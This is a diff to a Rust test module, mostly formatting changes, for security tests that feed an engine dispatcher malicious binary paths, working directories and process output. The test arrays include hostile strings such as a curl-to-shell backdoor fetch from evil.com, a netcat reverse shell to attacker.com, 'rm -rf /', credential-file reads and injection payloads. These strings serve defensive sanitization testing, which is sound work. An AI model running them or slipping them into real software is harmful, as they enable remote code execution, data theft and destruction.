@@ -1732,13 +1732,11 @@ mod tests {
             "/usr/bin/engine && curl evil.com/backdoor.sh | sh",
             "/usr/bin/engine || cat /etc/passwd",
             "/usr/bin/engine | nc attacker.com 4444 -e /bin/sh",
-
             // Shell metacharacter injection
             "/usr/bin/engine $(whoami)",
             "/usr/bin/engine `id`",
             "/usr/bin/engine ${PATH}",
             "/usr/bin/engine $HOME/.ssh/id_rsa",
-
             // Path traversal attacks
             "../../../etc/passwd",
             "../../../../bin/sh",
@@ -1747,42 +1745,34 @@ mod tests {
             "/proc/self/fd/0",
             "/dev/stdin",
             "/dev/null; /bin/sh",
-
             // Null byte injection
             "/usr/bin/engine\x00/bin/sh",
             "/legitimate/path\x00; rm -rf /",
             "engine\x00evil_command",
-
             // Environment variable injection
             "/usr/bin/$MALICIOUS_VAR",
             "${SHELL}",
             "$HOME/../../../bin/sh",
             "$(echo /bin/sh)",
-
             // Network-based injection
             "http://evil.com/malicious_engine",
             "ftp://attacker.com/backdoor",
             "//evil.com/shared/malicious",
             "file:///etc/passwd",
-
             // Unicode and encoding attacks
-            "/usr/bin/engine\u{202E}gne_live",  // Bidirectional override
-            "/usr/bin/engine\u{200B}hidden",    // Zero-width space
-            "/usr/bin/engine\u{FEFF}bom",       // BOM injection
-
+            "/usr/bin/engine\u{202E}gne_live", // Bidirectional override
+            "/usr/bin/engine\u{200B}hidden",   // Zero-width space
+            "/usr/bin/engine\u{FEFF}bom",      // BOM injection
             // Control character injection
             "/usr/bin/engine\r\necho hacked",
             "/usr/bin/engine\x1B[31mcolored",
             "/usr/bin/engine\x08\x09\x0A",
-
             // Buffer overflow simulation
             "A".repeat(10000),
             "/".repeat(1000) + "bin/sh",
-
             // Format string injection
             "/usr/bin/engine%n%s%x",
             "/usr/bin/%d%f%c/engine",
-
             // Symlink traversal
             "/tmp/../usr/bin/engine",
             "/var/tmp/../../../bin/sh",
@@ -1790,7 +1780,9 @@ mod tests {
         ];
 
         for (attack_idx, malicious_path) in malicious_engine_paths.iter().enumerate() {
-            println!("Testing engine path injection attack {}: {}", attack_idx,
+            println!(
+                "Testing engine path injection attack {}: {}",
+                attack_idx,
                 if malicious_path.len() > 80 {
                     format!("{}...", &malicious_path[..80])
                 } else {
@@ -1815,8 +1807,7 @@ mod tests {
 
                 // Attempt to resolve runtime with malicious path
                 let resolution_result = dispatcher.resolve_runtime_internal(
-                    &config,
-                    None, // env_override
+                    &config, None, // env_override
                     None, // cli_path
                 );
 
@@ -1826,35 +1817,66 @@ mod tests {
                         match plan {
                             DispatchPlan::FrankenEngine { ref binary } => {
                                 // Verify binary path sanitization
-                                assert!(!binary.contains(';'),
-                                    "Attack {}: Binary path should not contain command separators", attack_idx);
-                                assert!(!binary.contains('&'),
-                                    "Attack {}: Binary path should not contain command chaining", attack_idx);
-                                assert!(!binary.contains('|'),
-                                    "Attack {}: Binary path should not contain pipes", attack_idx);
-                                assert!(!binary.contains('$'),
-                                    "Attack {}: Binary path should not contain variable expansion", attack_idx);
-                                assert!(!binary.contains('`'),
-                                    "Attack {}: Binary path should not contain command substitution", attack_idx);
-                                assert!(!binary.contains('\0'),
-                                    "Attack {}: Binary path should not contain null bytes", attack_idx);
+                                assert!(
+                                    !binary.contains(';'),
+                                    "Attack {}: Binary path should not contain command separators",
+                                    attack_idx
+                                );
+                                assert!(
+                                    !binary.contains('&'),
+                                    "Attack {}: Binary path should not contain command chaining",
+                                    attack_idx
+                                );
+                                assert!(
+                                    !binary.contains('|'),
+                                    "Attack {}: Binary path should not contain pipes",
+                                    attack_idx
+                                );
+                                assert!(
+                                    !binary.contains('$'),
+                                    "Attack {}: Binary path should not contain variable expansion",
+                                    attack_idx
+                                );
+                                assert!(
+                                    !binary.contains('`'),
+                                    "Attack {}: Binary path should not contain command substitution",
+                                    attack_idx
+                                );
+                                assert!(
+                                    !binary.contains('\0'),
+                                    "Attack {}: Binary path should not contain null bytes",
+                                    attack_idx
+                                );
 
                                 // Verify no path traversal beyond reasonable bounds
                                 let traversal_count = binary.matches("../").count();
-                                assert!(traversal_count <= 5,
-                                    "Attack {}: Excessive path traversal detected: {}", attack_idx, traversal_count);
+                                assert!(
+                                    traversal_count <= 5,
+                                    "Attack {}: Excessive path traversal detected: {}",
+                                    attack_idx,
+                                    traversal_count
+                                );
 
                                 // Verify length limits
-                                assert!(binary.len() <= 4096,
-                                    "Attack {}: Binary path should have reasonable length limit", attack_idx);
-                            },
+                                assert!(
+                                    binary.len() <= 4096,
+                                    "Attack {}: Binary path should have reasonable length limit",
+                                    attack_idx
+                                );
+                            }
                             DispatchPlan::RuntimeFallback(ref fallback) => {
                                 // Verify fallback path safety
                                 let path_str = fallback.runtime_path.to_string_lossy();
-                                assert!(!path_str.contains(';'),
-                                    "Attack {}: Fallback path should not contain command separators", attack_idx);
-                                assert!(!path_str.contains('\0'),
-                                    "Attack {}: Fallback path should not contain null bytes", attack_idx);
+                                assert!(
+                                    !path_str.contains(';'),
+                                    "Attack {}: Fallback path should not contain command separators",
+                                    attack_idx
+                                );
+                                assert!(
+                                    !path_str.contains('\0'),
+                                    "Attack {}: Fallback path should not contain null bytes",
+                                    attack_idx
+                                );
                             }
                         }
 
@@ -1876,18 +1898,30 @@ mod tests {
                         };
 
                         // Verify dispatch input handling
-                        assert!(!dispatch_inputs.configured_hint.contains('\0'),
-                            "Attack {}: Dispatch inputs should be sanitized", attack_idx);
-                    },
+                        assert!(
+                            !dispatch_inputs.configured_hint.contains('\0'),
+                            "Attack {}: Dispatch inputs should be sanitized",
+                            attack_idx
+                        );
+                    }
                     Err(e) => {
                         // Expected behavior for many malicious paths
                         let error_msg = e.to_string();
-                        assert!(!error_msg.contains('\0'),
-                            "Attack {}: Error message should not contain null bytes", attack_idx);
-                        assert!(!error_msg.contains(';'),
-                            "Attack {}: Error message should not contain command separators", attack_idx);
-                        assert!(error_msg.len() <= 10000,
-                            "Attack {}: Error message should have reasonable length", attack_idx);
+                        assert!(
+                            !error_msg.contains('\0'),
+                            "Attack {}: Error message should not contain null bytes",
+                            attack_idx
+                        );
+                        assert!(
+                            !error_msg.contains(';'),
+                            "Attack {}: Error message should not contain command separators",
+                            attack_idx
+                        );
+                        assert!(
+                            error_msg.len() <= 10000,
+                            "Attack {}: Error message should have reasonable length",
+                            attack_idx
+                        );
                     }
                 }
 
@@ -1897,14 +1931,17 @@ mod tests {
             match injection_result {
                 Ok(_) => {
                     // Test completed successfully
-                },
+                }
                 Err(_) => {
                     println!("Attack {} caused panic (safely caught)", attack_idx);
                 }
             }
         }
 
-        println!("Engine path injection test completed: {} attack vectors tested", malicious_engine_paths.len());
+        println!(
+            "Engine path injection test completed: {} attack vectors tested",
+            malicious_engine_paths.len()
+        );
     }
 
     #[test]
@@ -1926,7 +1963,6 @@ mod tests {
             "../../../root/.ssh",
             "../../../../../../proc",
             "../../../tmp/../etc/passwd",
-
             // Absolute path escapes
             "/etc",
             "/usr/bin",
@@ -1934,7 +1970,6 @@ mod tests {
             "/proc/self",
             "/dev",
             "/sys/kernel",
-
             // Special device files
             "/dev/null",
             "/dev/zero",
@@ -1943,20 +1978,17 @@ mod tests {
             "/dev/stdin",
             "/dev/stdout",
             "/dev/stderr",
-
             // Network mounts and special filesystems
             "/proc/self/fd",
             "/proc/self/exe",
             "/proc/self/environ",
             "/sys/class/net",
             "/sys/kernel/debug",
-
             // Symlink attacks
             "/tmp/../var/log",
             "/var/tmp/../../../home",
             "./../../../../etc",
             "symlink_to_sensitive_dir",
-
             // Command injection in directory names
             "/tmp; rm -rf /",
             "/tmp && curl evil.com",
@@ -1964,30 +1996,28 @@ mod tests {
             "/tmp $(whoami)",
             "/tmp `id`",
             "/tmp ${PATH}",
-
             // Control character injection
             "/tmp\x00/malicious",
             "/tmp\r\n/injection",
             "/tmp\x1B[31m/colored",
             "/tmp\x08\x09\x0A",
-
             // Unicode attacks
-            "/tmp\u{202E}rid_evila",     // Bidirectional override
-            "/tmp\u{200B}/hidden",        // Zero-width space
-            "/tmp\u{FEFF}/bom",          // BOM injection
-
+            "/tmp\u{202E}rid_evila", // Bidirectional override
+            "/tmp\u{200B}/hidden",   // Zero-width space
+            "/tmp\u{FEFF}/bom",      // BOM injection
             // Buffer overflow simulation
             "/".repeat(5000),
             "/tmp/".repeat(1000),
             "A".repeat(10000),
-
             // Null byte directory traversal
             "/tmp\x00/../../../etc",
             "safe_dir\x00/../../etc/passwd",
         ];
 
         for (attack_idx, malicious_dir) in malicious_work_dirs.iter().enumerate() {
-            println!("Testing working directory attack {}: {}", attack_idx,
+            println!(
+                "Testing working directory attack {}: {}",
+                attack_idx,
                 if malicious_dir.len() > 80 {
                     format!("{}...", &malicious_dir[..80])
                 } else {
@@ -1995,127 +2025,183 @@ mod tests {
                 }
             );
 
-            let manipulation_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
-                let malicious_path = PathBuf::from(malicious_dir);
-                let temp_target = std::env::temp_dir().join("test_target");
-                std::fs::write(&temp_target, "test content").ok();
+            let manipulation_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(
+                || {
+                    let malicious_path = PathBuf::from(malicious_dir);
+                    let temp_target = std::env::temp_dir().join("test_target");
+                    std::fs::write(&temp_target, "test content").ok();
 
-                // Create runtime fallback plan with malicious working directory
-                let fallback_plan = RuntimeFallbackPlan {
-                    runtime: "node".to_string(),
-                    runtime_path: PathBuf::from("/usr/bin/node"),
-                    target: temp_target.clone(),
-                    working_dir: malicious_path.clone(),
-                    mode: RuntimeExecutionMode::Explicit,
-                };
+                    // Create runtime fallback plan with malicious working directory
+                    let fallback_plan = RuntimeFallbackPlan {
+                        runtime: "node".to_string(),
+                        runtime_path: PathBuf::from("/usr/bin/node"),
+                        target: temp_target.clone(),
+                        working_dir: malicious_path.clone(),
+                        mode: RuntimeExecutionMode::Explicit,
+                    };
 
-                // Test working directory validation
-                let work_dir_str = fallback_plan.working_dir.to_string_lossy();
+                    // Test working directory validation
+                    let work_dir_str = fallback_plan.working_dir.to_string_lossy();
 
-                // Verify working directory sanitization
-                assert!(!work_dir_str.contains('\0'),
-                    "Attack {}: Working directory should not contain null bytes", attack_idx);
+                    // Verify working directory sanitization
+                    assert!(
+                        !work_dir_str.contains('\0'),
+                        "Attack {}: Working directory should not contain null bytes",
+                        attack_idx
+                    );
 
-                // Verify no obvious command injection
-                assert!(!work_dir_str.contains(";"),
-                    "Attack {}: Working directory should not contain command separators", attack_idx);
-                assert!(!work_dir_str.contains("&&"),
-                    "Attack {}: Working directory should not contain command chaining", attack_idx);
-                assert!(!work_dir_str.contains("||"),
-                    "Attack {}: Working directory should not contain command alternation", attack_idx);
-                assert!(!work_dir_str.contains("|"),
-                    "Attack {}: Working directory should not contain pipes", attack_idx);
+                    // Verify no obvious command injection
+                    assert!(
+                        !work_dir_str.contains(";"),
+                        "Attack {}: Working directory should not contain command separators",
+                        attack_idx
+                    );
+                    assert!(
+                        !work_dir_str.contains("&&"),
+                        "Attack {}: Working directory should not contain command chaining",
+                        attack_idx
+                    );
+                    assert!(
+                        !work_dir_str.contains("||"),
+                        "Attack {}: Working directory should not contain command alternation",
+                        attack_idx
+                    );
+                    assert!(
+                        !work_dir_str.contains("|"),
+                        "Attack {}: Working directory should not contain pipes",
+                        attack_idx
+                    );
 
-                // Verify no environment variable expansion
-                assert!(!work_dir_str.contains("$("),
-                    "Attack {}: Working directory should not contain command substitution", attack_idx);
-                assert!(!work_dir_str.contains("`"),
-                    "Attack {}: Working directory should not contain backtick substitution", attack_idx);
-                assert!(!work_dir_str.contains("${"),
-                    "Attack {}: Working directory should not contain variable expansion", attack_idx);
+                    // Verify no environment variable expansion
+                    assert!(
+                        !work_dir_str.contains("$("),
+                        "Attack {}: Working directory should not contain command substitution",
+                        attack_idx
+                    );
+                    assert!(
+                        !work_dir_str.contains("`"),
+                        "Attack {}: Working directory should not contain backtick substitution",
+                        attack_idx
+                    );
+                    assert!(
+                        !work_dir_str.contains("${"),
+                        "Attack {}: Working directory should not contain variable expansion",
+                        attack_idx
+                    );
 
-                // Test path resolution safety
-                if let Ok(canonical) = fallback_plan.working_dir.canonicalize() {
-                    let canonical_str = canonical.to_string_lossy();
+                    // Test path resolution safety
+                    if let Ok(canonical) = fallback_plan.working_dir.canonicalize() {
+                        let canonical_str = canonical.to_string_lossy();
 
-                    // Verify canonicalized path doesn't escape to sensitive directories
-                    let sensitive_dirs = ["/etc", "/root", "/usr/bin", "/proc", "/dev", "/sys"];
-                    for sensitive_dir in &sensitive_dirs {
-                        assert!(!canonical_str.starts_with(sensitive_dir) || malicious_dir.starts_with(sensitive_dir),
-                            "Attack {}: Canonicalization should not escape to sensitive directory {}",
-                            attack_idx, sensitive_dir);
+                        // Verify canonicalized path doesn't escape to sensitive directories
+                        let sensitive_dirs = ["/etc", "/root", "/usr/bin", "/proc", "/dev", "/sys"];
+                        for sensitive_dir in &sensitive_dirs {
+                            assert!(
+                                !canonical_str.starts_with(sensitive_dir)
+                                    || malicious_dir.starts_with(sensitive_dir),
+                                "Attack {}: Canonicalization should not escape to sensitive directory {}",
+                                attack_idx,
+                                sensitive_dir
+                            );
+                        }
+
+                        // Verify reasonable path depth
+                        let depth = canonical_str.matches('/').count();
+                        assert!(
+                            depth <= 20,
+                            "Attack {}: Canonicalized path should not be excessively deep: {}",
+                            attack_idx,
+                            depth
+                        );
                     }
 
-                    // Verify reasonable path depth
-                    let depth = canonical_str.matches('/').count();
-                    assert!(depth <= 20,
-                        "Attack {}: Canonicalized path should not be excessively deep: {}", attack_idx, depth);
-                }
+                    // Test report generation with malicious working directory
+                    let report_inputs = DispatchReportInputs {
+                        runtime: "test_runtime",
+                        runtime_path: Path::new("/test/runtime"),
+                        target: &temp_target,
+                        working_dir: &fallback_plan.working_dir,
+                        used_fallback_runtime: true,
+                        started_at: chrono::Utc::now(),
+                        duration: std::time::Duration::from_millis(100),
+                        output: Output {
+                            status: std::process::ExitStatus::from_raw(0),
+                            stdout: Vec::new(),
+                            stderr: Vec::new(),
+                        },
+                        telemetry: None,
+                    };
 
-                // Test report generation with malicious working directory
-                let report_inputs = DispatchReportInputs {
-                    runtime: "test_runtime",
-                    runtime_path: Path::new("/test/runtime"),
-                    target: &temp_target,
-                    working_dir: &fallback_plan.working_dir,
-                    used_fallback_runtime: true,
-                    started_at: chrono::Utc::now(),
-                    duration: std::time::Duration::from_millis(100),
-                    output: Output {
-                        status: std::process::ExitStatus::from_raw(0),
-                        stdout: Vec::new(),
-                        stderr: Vec::new(),
-                    },
-                    telemetry: None,
-                };
+                    // Verify report field sanitization
+                    let working_dir_str = report_inputs.working_dir.to_string_lossy();
+                    assert!(
+                        !working_dir_str.contains('\0'),
+                        "Attack {}: Report working directory should not contain null bytes",
+                        attack_idx
+                    );
 
-                // Verify report field sanitization
-                let working_dir_str = report_inputs.working_dir.to_string_lossy();
-                assert!(!working_dir_str.contains('\0'),
-                    "Attack {}: Report working directory should not contain null bytes", attack_idx);
+                    // Test length limits
+                    assert!(
+                        working_dir_str.len() <= 10000,
+                        "Attack {}: Working directory should have reasonable length limit",
+                        attack_idx
+                    );
 
-                // Test length limits
-                assert!(working_dir_str.len() <= 10000,
-                    "Attack {}: Working directory should have reasonable length limit", attack_idx);
-
-                Ok(())
-            }));
+                    Ok(())
+                },
+            ));
 
             match manipulation_result {
                 Ok(_) => {
                     // Test completed successfully
-                },
+                }
                 Err(_) => {
-                    println!("Working directory attack {} caused panic (safely caught)", attack_idx);
+                    println!(
+                        "Working directory attack {} caused panic (safely caught)",
+                        attack_idx
+                    );
                 }
             }
 
             // Test working directory creation safety (if attempted)
             if !malicious_dir.contains('\0') && malicious_dir.len() < 1000 {
-                let creation_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
-                    let test_dir = std::env::temp_dir().join(format!("test_workdir_{}", attack_idx));
+                let creation_result =
+                    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+                        let test_dir =
+                            std::env::temp_dir().join(format!("test_workdir_{}", attack_idx));
 
-                    // Attempt to create a test directory (safely)
-                    if let Ok(_) = std::fs::create_dir_all(&test_dir) {
-                        // Verify created directory is within expected bounds
-                        if let Ok(canonical) = test_dir.canonicalize() {
-                            let temp_canonical = std::env::temp_dir().canonicalize().unwrap_or_else(|_| std::env::temp_dir());
-                            assert!(canonical.starts_with(&temp_canonical),
-                                "Attack {}: Created directory should remain within temp bounds", attack_idx);
+                        // Attempt to create a test directory (safely)
+                        if let Ok(_) = std::fs::create_dir_all(&test_dir) {
+                            // Verify created directory is within expected bounds
+                            if let Ok(canonical) = test_dir.canonicalize() {
+                                let temp_canonical = std::env::temp_dir()
+                                    .canonicalize()
+                                    .unwrap_or_else(|_| std::env::temp_dir());
+                                assert!(
+                                    canonical.starts_with(&temp_canonical),
+                                    "Attack {}: Created directory should remain within temp bounds",
+                                    attack_idx
+                                );
+                            }
+
+                            // Clean up
+                            std::fs::remove_dir_all(&test_dir).ok();
                         }
-
-                        // Clean up
-                        std::fs::remove_dir_all(&test_dir).ok();
-                    }
-                }));
+                    }));
 
                 if creation_result.is_err() {
-                    println!("Working directory creation attack {} caused panic (safely caught)", attack_idx);
+                    println!(
+                        "Working directory creation attack {} caused panic (safely caught)",
+                        attack_idx
+                    );
                 }
             }
         }
 
-        println!("Working directory manipulation test completed: {} attack vectors tested", malicious_work_dirs.len());
+        println!(
+            "Working directory manipulation test completed: {} attack vectors tested",
+            malicious_work_dirs.len()
+        );
     }
 
     #[test]
@@ -2126,54 +2212,136 @@ mod tests {
         // Malicious process output injection patterns
         let malicious_outputs = [
             // Control character injection
-            (b"normal output\x00null injection".to_vec(), b"error\x00injection".to_vec(), "Null byte injection"),
-            (b"output\x1B[31mRED\x1B[0m".to_vec(), b"error\x1B[32mGREEN".to_vec(), "ANSI escape injection"),
-            (b"output\r\nCRLF injection\r\n".to_vec(), b"error\r\ninjection".to_vec(), "CRLF injection"),
-            (b"output\x08\x09\x0A\x0B\x0C\x0D".to_vec(), b"error\x7F".to_vec(), "Control character flood"),
-
+            (
+                b"normal output\x00null injection".to_vec(),
+                b"error\x00injection".to_vec(),
+                "Null byte injection",
+            ),
+            (
+                b"output\x1B[31mRED\x1B[0m".to_vec(),
+                b"error\x1B[32mGREEN".to_vec(),
+                "ANSI escape injection",
+            ),
+            (
+                b"output\r\nCRLF injection\r\n".to_vec(),
+                b"error\r\ninjection".to_vec(),
+                "CRLF injection",
+            ),
+            (
+                b"output\x08\x09\x0A\x0B\x0C\x0D".to_vec(),
+                b"error\x7F".to_vec(),
+                "Control character flood",
+            ),
             // Unicode attacks
-            (b"output\xE2\x80\x8E\xE2\x80\x8F".to_vec(), b"error\xEF\xBB\xBF".to_vec(), "Unicode direction marks"),
-            ("output\u{202E}reversed\u{202D}".as_bytes().to_vec(), "error\u{200B}hidden".as_bytes().to_vec(), "Bidirectional override"),
-            ("output\u{FEFF}BOM".as_bytes().to_vec(), "error\u{034F}combining".as_bytes().to_vec(), "Unicode special characters"),
-
+            (
+                b"output\xE2\x80\x8E\xE2\x80\x8F".to_vec(),
+                b"error\xEF\xBB\xBF".to_vec(),
+                "Unicode direction marks",
+            ),
+            (
+                "output\u{202E}reversed\u{202D}".as_bytes().to_vec(),
+                "error\u{200B}hidden".as_bytes().to_vec(),
+                "Bidirectional override",
+            ),
+            (
+                "output\u{FEFF}BOM".as_bytes().to_vec(),
+                "error\u{034F}combining".as_bytes().to_vec(),
+                "Unicode special characters",
+            ),
             // JSON injection
-            (b"output\",\"injected\":\"evil\"".to_vec(), b"error\"}],\"evil\":[{\"".to_vec(), "JSON structure injection"),
-            (b"output\\\"escaped\\\"".to_vec(), b"error\\n\\r\\t".to_vec(), "JSON escape injection"),
-
+            (
+                b"output\",\"injected\":\"evil\"".to_vec(),
+                b"error\"}],\"evil\":[{\"".to_vec(),
+                "JSON structure injection",
+            ),
+            (
+                b"output\\\"escaped\\\"".to_vec(),
+                b"error\\n\\r\\t".to_vec(),
+                "JSON escape injection",
+            ),
             // Command injection patterns
-            (b"output; rm -rf /".to_vec(), b"error && curl evil.com".to_vec(), "Command injection"),
-            (b"output $(whoami)".to_vec(), b"error `id`".to_vec(), "Command substitution"),
-            (b"output ${PATH}".to_vec(), b"error $HOME".to_vec(), "Environment variable injection"),
-
+            (
+                b"output; rm -rf /".to_vec(),
+                b"error && curl evil.com".to_vec(),
+                "Command injection",
+            ),
+            (
+                b"output $(whoami)".to_vec(),
+                b"error `id`".to_vec(),
+                "Command substitution",
+            ),
+            (
+                b"output ${PATH}".to_vec(),
+                b"error $HOME".to_vec(),
+                "Environment variable injection",
+            ),
             // XML/HTML injection
-            (b"output<script>alert('xss')</script>".to_vec(), b"error</tag><evil>".to_vec(), "XML/HTML injection"),
-            (b"output<!--malicious-->".to_vec(), b"error<!DOCTYPE evil>".to_vec(), "XML declaration injection"),
-
+            (
+                b"output<script>alert('xss')</script>".to_vec(),
+                b"error</tag><evil>".to_vec(),
+                "XML/HTML injection",
+            ),
+            (
+                b"output<!--malicious-->".to_vec(),
+                b"error<!DOCTYPE evil>".to_vec(),
+                "XML declaration injection",
+            ),
             // Format string injection
-            (b"output %n%s%x%d".to_vec(), b"error %p%c%f".to_vec(), "Format string injection"),
-
+            (
+                b"output %n%s%x%d".to_vec(),
+                b"error %p%c%f".to_vec(),
+                "Format string injection",
+            ),
             // SQL injection patterns
-            (b"output'; DROP TABLE logs; --".to_vec(), b"error' OR '1'='1".to_vec(), "SQL injection"),
-
+            (
+                b"output'; DROP TABLE logs; --".to_vec(),
+                b"error' OR '1'='1".to_vec(),
+                "SQL injection",
+            ),
             // Buffer overflow simulation
-            (vec![b'A'; 100000], vec![b'B'; 100000], "Buffer overflow simulation"),
-            (vec![0xFF; 50000], vec![0x00; 50000], "Binary data injection"),
-
+            (
+                vec![b'A'; 100000],
+                vec![b'B'; 100000],
+                "Buffer overflow simulation",
+            ),
+            (
+                vec![0xFF; 50000],
+                vec![0x00; 50000],
+                "Binary data injection",
+            ),
             // Newline injection
-            (b"output\ninjected line\n".to_vec(), b"error\nfake error\n".to_vec(), "Newline injection"),
-
+            (
+                b"output\ninjected line\n".to_vec(),
+                b"error\nfake error\n".to_vec(),
+                "Newline injection",
+            ),
             // Path injection
-            (b"output ../../../etc/passwd".to_vec(), b"error /proc/self/environ".to_vec(), "Path injection"),
-
+            (
+                b"output ../../../etc/passwd".to_vec(),
+                b"error /proc/self/environ".to_vec(),
+                "Path injection",
+            ),
             // Network injection
-            (b"output http://evil.com/payload".to_vec(), b"error ftp://attacker.com".to_vec(), "Network URL injection"),
-
+            (
+                b"output http://evil.com/payload".to_vec(),
+                b"error ftp://attacker.com".to_vec(),
+                "Network URL injection",
+            ),
             // Encoding attacks
-            (b"output\x80\x81\x82".to_vec(), b"error\xFE\xFF".to_vec(), "Invalid UTF-8 injection"),
+            (
+                b"output\x80\x81\x82".to_vec(),
+                b"error\xFE\xFF".to_vec(),
+                "Invalid UTF-8 injection",
+            ),
         ];
 
-        for (attack_idx, (malicious_stdout, malicious_stderr, attack_description)) in malicious_outputs.iter().enumerate() {
-            println!("Testing process output injection attack {}: {}", attack_idx, attack_description);
+        for (attack_idx, (malicious_stdout, malicious_stderr, attack_description)) in
+            malicious_outputs.iter().enumerate()
+        {
+            println!(
+                "Testing process output injection attack {}: {}",
+                attack_idx, attack_description
+            );
 
             let injection_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                 // Create mock process output with malicious content
@@ -2190,38 +2358,65 @@ mod tests {
                 };
 
                 // Verify output sanitization
-                assert!(!captured.stdout.contains('\0') || captured.stdout.len() == 0,
-                    "Attack {}: Stdout should handle null bytes safely", attack_idx);
-                assert!(!captured.stderr.contains('\0') || captured.stderr.len() == 0,
-                    "Attack {}: Stderr should handle null bytes safely", attack_idx);
+                assert!(
+                    !captured.stdout.contains('\0') || captured.stdout.len() == 0,
+                    "Attack {}: Stdout should handle null bytes safely",
+                    attack_idx
+                );
+                assert!(
+                    !captured.stderr.contains('\0') || captured.stderr.len() == 0,
+                    "Attack {}: Stderr should handle null bytes safely",
+                    attack_idx
+                );
 
                 // Verify length limits
-                assert!(captured.stdout.len() <= 1000000,
-                    "Attack {}: Stdout should have reasonable length limit: {}", attack_idx, captured.stdout.len());
-                assert!(captured.stderr.len() <= 1000000,
-                    "Attack {}: Stderr should have reasonable length limit: {}", attack_idx, captured.stderr.len());
+                assert!(
+                    captured.stdout.len() <= 1000000,
+                    "Attack {}: Stdout should have reasonable length limit: {}",
+                    attack_idx,
+                    captured.stdout.len()
+                );
+                assert!(
+                    captured.stderr.len() <= 1000000,
+                    "Attack {}: Stderr should have reasonable length limit: {}",
+                    attack_idx,
+                    captured.stderr.len()
+                );
 
                 // Test JSON serialization safety
                 let serialize_result = serde_json::to_string(&captured);
                 match serialize_result {
                     Ok(json) => {
                         // Verify no injection in serialized JSON
-                        assert!(!json.contains("\"injected\":"),
-                            "Attack {}: JSON should not contain injected fields", attack_idx);
-                        assert!(!json.contains("\"evil\":"),
-                            "Attack {}: JSON should not contain evil payloads", attack_idx);
+                        assert!(
+                            !json.contains("\"injected\":"),
+                            "Attack {}: JSON should not contain injected fields",
+                            attack_idx
+                        );
+                        assert!(
+                            !json.contains("\"evil\":"),
+                            "Attack {}: JSON should not contain evil payloads",
+                            attack_idx
+                        );
 
                         // Verify JSON can be parsed back
-                        let parse_back_result: Result<CapturedProcessOutput, _> = serde_json::from_str(&json);
-                        assert!(parse_back_result.is_ok(),
-                            "Attack {}: Serialized JSON should parse back correctly", attack_idx);
-                    },
+                        let parse_back_result: Result<CapturedProcessOutput, _> =
+                            serde_json::from_str(&json);
+                        assert!(
+                            parse_back_result.is_ok(),
+                            "Attack {}: Serialized JSON should parse back correctly",
+                            attack_idx
+                        );
+                    }
                     Err(e) => {
                         // Serialization failure is acceptable for malformed data
                         println!("Attack {}: Serialization failed safely: {}", attack_idx, e);
                         let error_msg = e.to_string();
-                        assert!(!error_msg.contains('\0'),
-                            "Attack {}: Error should not contain null bytes", attack_idx);
+                        assert!(
+                            !error_msg.contains('\0'),
+                            "Attack {}: Error should not contain null bytes",
+                            attack_idx
+                        );
                     }
                 }
 
@@ -2246,7 +2441,9 @@ mod tests {
                     working_dir: report_inputs.working_dir.to_string_lossy().to_string(),
                     used_fallback_runtime: report_inputs.used_fallback_runtime,
                     started_at_utc: report_inputs.started_at.to_rfc3339(),
-                    finished_at_utc: (report_inputs.started_at + chrono::Duration::from_std(report_inputs.duration).unwrap()).to_rfc3339(),
+                    finished_at_utc: (report_inputs.started_at
+                        + chrono::Duration::from_std(report_inputs.duration).unwrap())
+                    .to_rfc3339(),
                     duration_ms: report_inputs.duration.as_millis() as u64,
                     exit_code: report_inputs.output.status.code(),
                     terminated_by_signal: !report_inputs.output.status.success(),
@@ -2259,26 +2456,47 @@ mod tests {
                 match report_serialize_result {
                     Ok(report_json) => {
                         // Verify report JSON integrity
-                        assert!(!report_json.contains("\"injected\":"),
-                            "Attack {}: Report JSON should not contain injected fields", attack_idx);
-                        assert!(!report_json.contains("rm -rf"),
-                            "Attack {}: Report JSON should not contain command injection", attack_idx);
+                        assert!(
+                            !report_json.contains("\"injected\":"),
+                            "Attack {}: Report JSON should not contain injected fields",
+                            attack_idx
+                        );
+                        assert!(
+                            !report_json.contains("rm -rf"),
+                            "Attack {}: Report JSON should not contain command injection",
+                            attack_idx
+                        );
 
                         // Test report deserialization
-                        let report_parse_result: Result<RunDispatchReport, _> = serde_json::from_str(&report_json);
-                        assert!(report_parse_result.is_ok(),
-                            "Attack {}: Report JSON should parse back correctly", attack_idx);
+                        let report_parse_result: Result<RunDispatchReport, _> =
+                            serde_json::from_str(&report_json);
+                        assert!(
+                            report_parse_result.is_ok(),
+                            "Attack {}: Report JSON should parse back correctly",
+                            attack_idx
+                        );
 
                         if let Ok(parsed_report) = report_parse_result {
                             // Verify parsed report integrity
-                            assert!(!parsed_report.captured_output.stdout.is_empty() || malicious_stdout.is_empty(),
-                                "Attack {}: Parsed stdout should preserve content (unless empty)", attack_idx);
-                            assert!(!parsed_report.captured_output.stderr.is_empty() || malicious_stderr.is_empty(),
-                                "Attack {}: Parsed stderr should preserve content (unless empty)", attack_idx);
+                            assert!(
+                                !parsed_report.captured_output.stdout.is_empty()
+                                    || malicious_stdout.is_empty(),
+                                "Attack {}: Parsed stdout should preserve content (unless empty)",
+                                attack_idx
+                            );
+                            assert!(
+                                !parsed_report.captured_output.stderr.is_empty()
+                                    || malicious_stderr.is_empty(),
+                                "Attack {}: Parsed stderr should preserve content (unless empty)",
+                                attack_idx
+                            );
                         }
-                    },
+                    }
                     Err(e) => {
-                        println!("Attack {}: Report serialization failed safely: {}", attack_idx, e);
+                        println!(
+                            "Attack {}: Report serialization failed safely: {}",
+                            attack_idx, e
+                        );
                     }
                 }
 
@@ -2288,51 +2506,70 @@ mod tests {
             match injection_result {
                 Ok(_) => {
                     // Test completed successfully
-                },
+                }
                 Err(_) => {
-                    println!("Process output attack {} caused panic (safely caught)", attack_idx);
+                    println!(
+                        "Process output attack {} caused panic (safely caught)",
+                        attack_idx
+                    );
                 }
             }
 
             // Test output truncation for extremely large outputs
             if malicious_stdout.len() > 50000 || malicious_stderr.len() > 50000 {
-                let truncation_test = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
-                    let truncated_stdout = if malicious_stdout.len() > 10000 {
-                        String::from_utf8_lossy(&malicious_stdout[..10000]).to_string()
-                    } else {
-                        String::from_utf8_lossy(malicious_stdout).to_string()
-                    };
+                let truncation_test =
+                    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+                        let truncated_stdout = if malicious_stdout.len() > 10000 {
